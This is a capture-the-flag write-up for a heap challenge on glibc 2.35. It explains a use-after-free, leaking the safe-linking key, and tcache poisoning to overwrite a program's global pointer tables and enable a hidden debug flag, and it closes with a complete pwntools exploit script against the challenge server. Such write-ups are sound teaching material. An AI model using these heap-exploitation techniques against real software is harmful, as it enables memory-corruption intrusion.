# Hard PWN By AI — Writeup

## Challenge summary

The binary is a small heap manager with six menu options:

1. Allocate chunk
2. Free chunk
3. Edit chunk
4. View chunk
5. Debug info
6. Exit

At first glance it looks like a standard heap challenge. In practice, the intended path is much easier than a full libc hook attack because the program contains a hidden **debug flag** that can be turned on from user-controlled memory.

---

## Binary behavior

Static analysis shows three important global objects in the PIE binary:

- `debug` at `0x4020`
- `chunks[16]` at `0x4080`
- `sizes[16]` at `0x4100`

The menu printer lives at `0x1358`, which is also used by the debug menu to leak PIE.

The hidden flag-printing routine opens `/home/ctf/flag` and prints it if the global debug variable is non-zero.

### Relevant menu handlers

The chunk logic has the classic bug pattern:

- `allocate` stores the pointer in `chunks[idx]` and the size in `sizes[idx]`
- `free` calls `free(chunks[idx])` but **does not clear the pointer**
- `edit` calls `read(0, chunks[idx], len)` on the stale pointer
- `view` calls `write(1, chunks[idx], sizes[idx])` on the stale pointer

That gives us:

- **use-after-free**
- **double free**
- arbitrary reads and writes after a successful tcache poison

---

## Protection summary

The binary is PIE and dynamically linked against the provided libc.

The provided libc is:

- Ubuntu glibc `2.35`

That detail matters because `__free_hook` still exists as a symbol in 2.35, but modern glibc no longer uses malloc hooks in the old way. A classic `__free_hook = system` plan is therefore unreliable here.

Fortunately, we do not need it.

---

## Debug info leak

Menu option 5 prints two values:

- a pointer to the global `chunks` array
- a pointer to the menu function at `0x1358`

So option 5 gives us both:

- a direct **PIE base leak**
- the address of the global pointer table in `.bss`

That already removes most of the normal heap challenge difficulty.

---

## Vulnerability chain

The central bug is that freed chunk pointers stay in `chunks[idx]`.

So after:

- allocating two same-sized chunks `A` and `B`
- freeing `B`
- freeing `A`

we still have valid menu access to both stale entries.

Because the binary uses glibc 2.35, the tcache forward pointer is protected with safe-linking:

```text
stored_fd = next ^ (chunk_addr >> 12)
```

But the program prints allocated chunk addresses during allocation, so we know both `A` and `B` precisely.

After `free(B); free(A);`, viewing chunk `A` leaks the encoded `fd`, which points to `B`.

Therefore:

```text
key = leaked_fd ^ B = A >> 12
```

Once we know that safe-linking key, we can poison the tcache entry for `A` so that the next allocation returns an address of our choice.

---

## Turning tcache poison into a global-table overwrite

The best target is not the GOT and not libc hooks.

The best target is the program's own global table:

- `chunks` at `PIE + 0x4080`
- `sizes` at `PIE + 0x4100`

If we poison the tcache so that the second allocation returns `chunks`, then one menu index becomes a writable view over the entire `chunks/sizes` metadata region.

That gives us full control over:

- which pointer each logical chunk index uses
- how many bytes `view()` prints
- where `edit()` writes

At that point the challenge is effectively over.

---

## The easy win: overwrite the `debug` flag

The binary contains a hidden check in option 6:

- if `debug == 0`, it prints `Goodbye!`
- if `debug != 0`, it calls the hidden flag-printing routine first

So instead of building a shell, we only need to:

1. gain write access to the global chunk table
2. repoint one logical chunk index to `PIE + 0x4020`
3. write a non-zero value there
4. choose menu option 6

That is far cleaner than any libc-based post-exploitation.

---

## Full exploit strategy

### Step 1: leak PIE and `chunks`

Use option 5.

From the debug output:

- `chunks_addr` is printed directly
- `pie_base = pie_hint - 0x1358`

### Step 2: prepare a tcache bin

Allocate two chunks of the same size:

- chunk 0 = `A`
- chunk 1 = `B`

A size of `0x20` is enough.

### Step 3: free in the right order

Do:

- `free(1)`
- `free(0)`

Now the tcache list is:

```text
A -> B
```

### Step 4: leak the safe-linking key

Use `view(0)` on freed chunk `A`.

Its first eight bytes are the encoded `fd`.

Since we know `B`, recover the key:

```python
key = leaked_fd ^ B
```

### Step 5: poison `A->fd`

Overwrite the stale chunk `A` using `edit(0, ...)` and store:

```python
p64(chunks_addr ^ key)
```

That makes the tcache list behave as though the next pointer were the global `chunks` array.

### Step 6: allocate twice

- first allocation returns `A`
- second allocation returns `chunks_addr`

Now one index points directly at the program's global chunk metadata.

### Step 7: rewrite the metadata tables

Use that forged chunk to rewrite:

- `chunks[3] = chunks_addr` so the forged control chunk remains usable
- `sizes[3] = 0x100`
- `chunks[5] = pie_base + 0x4020` to target `debug`
- `sizes[5] = 8`

### Step 8: set `debug = 1`

Use `edit(5, p64(1))`.

### Step 9: exit cleanly

Choose option 6.

The program calls the hidden flag routine and prints the flag.

---

## Exploit script

```python
from pwn import *

HOST = "chal.polyuctf.com"
PORT = 31367

context.arch = "amd64"
context.log_level = "info"

PRINT_MENU_OFF = 0x1358
DEBUG_OFF = 0x4020
CHUNKS_OFF = 0x4080
SIZES_OFF = 0x4100


def start():
    return remote(HOST, PORT)


def menu(io, c):
    io.sendlineafter(b"Choice: ", str(c).encode())


def alloc(io, idx, size):
    menu(io, 1)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.recvuntil(f"Chunk {idx} allocated at ".encode())
    return int(io.recvline().strip(), 16)


def free_chunk(io, idx):
    menu(io, 2)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(f"Chunk {idx} freed".encode())


def edit(io, idx, data):
    menu(io, 3)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Length: ", str(len(data)).encode())
    io.sendafter(b"Data: ", data)
    io.recvuntil(b"Chunk updated!")


def view(io, idx):
    menu(io, 4)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(f"Chunk {idx} data: ".encode())
    return io.recvuntil(b"\n\n=== Secure Heap Manager", drop=True)


def debug(io):
    menu(io, 5)
    io.recvuntil(b"Heap base hint: ")
    chunks_addr = int(io.recvline().strip(), 16)
    io.recvuntil(b"PIE hint: ")
    pie_hint = int(io.recvline().strip(), 16)
    return chunks_addr, pie_hint


io = start()

# Leak PIE and the global chunk table
chunks_addr, pie_hint = debug(io)
pie_base = pie_hint - PRINT_MENU_OFF
log.info(f"chunks array @ {hex(chunks_addr)}")
log.info(f"PIE base     @ {hex(pie_base)}")

# Build a small tcache bin
A = alloc(io, 0, 0x20)
B = alloc(io, 1, 0x20)
log.info(f"A @ {hex(A)}")
log.info(f"B @ {hex(B)}")

free_chunk(io, 1)
free_chunk(io, 0)

# Leak the safe-linking key from freed chunk A
leak = view(io, 0)
fd = u64(leak[:8].ljust(8, b"\x00"))
key = fd ^ B
log.info(f"safe-link key = {hex(key)}")

# Poison A->fd so that the second malloc returns the global chunks array
edit(io, 0, p64(chunks_addr ^ key))

alloc(io, 2, 0x20)          # returns A
fake = alloc(io, 3, 0x20)   # returns chunks_addr
log.info(f"fake chunk @ {hex(fake)}")

# Rebuild the pointer and size tables
ptrs = [0] * 16
sizes = [0] * 16

# Keep idx 3 as a control chunk over the global metadata
ptrs[3] = chunks_addr
sizes[3] = 0x100

# Point idx 5 to the hidden debug variable
ptrs[5] = pie_base + DEBUG_OFF
sizes[5] = 8

payload = flat(ptrs + sizes)
edit(io, 3, payload)

# Turn on debug mode
edit(io, 5, p64(1))

# Trigger the hidden flag path
menu(io, 6)
io.interactive()
```

---

## Why the libc-hook approach is a trap

A natural first idea is:

- leak libc from `free@got`
- overwrite `__free_hook`
- free a `/bin/sh` chunk

That would have worked on older glibc versions.

But here the provided libc is glibc 2.35, where the old malloc hooks are not a reliable target anymore. The symbol still exists, which is misleading, but the clean solution is to avoid libc hooks entirely and use the program's own hidden debug path.

---

## Final notes

This challenge is a good example of why full control over **application metadata** is often stronger than a shell-oriented exploit.

Once we poisoned tcache into the `chunks/sizes` tables, we could have targeted many things:

- GOT entries for leaks
n- arbitrary writable globals
- hidden feature flags

The shortest path was simply to enable the hidden `debug` variable and let the program print the flag for us.
